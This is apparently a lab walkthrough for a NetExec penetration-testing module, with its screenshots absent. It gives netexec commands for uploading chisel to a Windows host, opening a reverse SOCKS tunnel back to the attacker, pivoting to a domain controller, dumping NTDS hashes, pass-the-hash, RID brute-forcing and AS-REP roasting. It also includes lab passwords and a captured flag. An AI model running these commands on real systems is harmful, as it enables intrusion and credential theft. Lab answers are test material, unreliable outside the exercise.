...
![image](../Imágenes/20250722085958.png)
...
![image](../Imágenes/20250722090107.png)
...
![image](../Imágenes/20250722090246.png)
...
```shell
nxc smb STMIP -u grace -p 'Inlanefreight01!' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
```

![image](../Imágenes/20250722090402.png)

And then, using command execution, `chisel.exe` can be used to make the target connect back to the attack host:

```shell
nxc smb STMIP -u grace -p 'Inlanefreight01!' -x "C:\Windows\Temp\chisel.exe client PWNIP:8080 R:socks"
```

![image](../Imágenes/20250722090848.png)

Students need to check their chisel server to ensure that the pivot host has connected:

![image](../Imágenes/20250722090554.png)

Additionally, `proxychains` must be configured to use port 1080 as a socks5 proxy:

![image](../Imágenes/20250722090756.png)

Finally, students can enumerate the internal 172.16.1.10 machine:

```shell
 proxychains nxc smb 172.16.1.10 -u robert -p Inlanefreight01!
```

![image](../Imágenes/20250722091016.png)
...
```shell
proxychains nxc winrm 172.16.1.10 -u robert -p Inlanefreight01! -x "more c:\users\robert\Desktop\flag.txt"
```

![image](../Imágenes/20250722091156.png)
...
```shell
nxc smb STMIP -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth --get-file \\Users\\Administrator\\Desktop\\julio_keys julio_keys
ls -la | grep julio
```

![image](../Imágenes/20250722091453.png)

```shell
nxc ssh 10.129.204.178 -u julio -p '' --key-file julio_keys -x "more C:\users\julio\desktop\flag.txt"
```

![image](../Imágenes/20250722091541.png)
...
![image](../Imágenes/20250722091910.png)
...
Students need to make sure that `Chisel` server is running from `Pwnbox`/`attacker-machine`, and that Windows target is configured as a chisel host. Using a socks5 proxy, students will target SMB on the internal domain controller authenticating as `robert:Inlanefreight01!` and dumping the NTDS secrets:

```shell
proxychains -q nxc smb 172.16.1.10 -u robert -p 'Inlanefreight01!' --ntds --enabled
```

![image](../Imágenes/20250722092342.png)

Once the log file is generated, students need to `cat` the file and filter for disabled accounts:

```shell
cat ~/.cme/logs/DC01_172.16.1.10_2023-01-12_170459.ntds | grep -i disabled | cut -d ':' -f1
```

Finding Secrets and Using Them

![image](../Imágenes/20250722092741.png)
...
![image](../Imágenes/20250722092839.png)
...
```shell
proxychains -q nxc winrm 172.16.1.10 -u soti -H 1bc3af33d22c1c2baec10a32db22c72d -x "more c:\users\soti\desktop\flag.txt"
```

![image](../Imágenes/20250722092956.png)

`P4%$_tH3_hash_with_S0t1`
...
![image](../Imágenes/20250722104520.png)
...
![image](../Imágenes/20250722114135.png)

Useful information about the network can be found in the dumped log files:

```shell
cat ~/.nxc/logs/inlanefreight.htb_network_2025-07-22_114054.log
```

Popular Modules

![image](../Imágenes/20250722114227.png)
...
![image](../Imágenes/20250722115204.png)
...
```shell
nxc smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' -x "more C:\Users\Administrator\Desktop\flag.txt" --local-auth
```
...
![image](../Imágenes/20250722123058.png)
## Question 1
...
![image](../Imágenes/20250722122547.png)
...
```shell
proxychains -q nxc smb 172.16.15.3 -u '' -p '' --rid-brute 6000 > users.txt
```

![image](../Imágenes/20250722123117.png)
...
![image](../Imágenes/20250722123145.png)
...
```shell
proxychains -q nxc ldap 10.129.204.182 -u skusers.txt -p '' --asreproast skasreproast.out
```
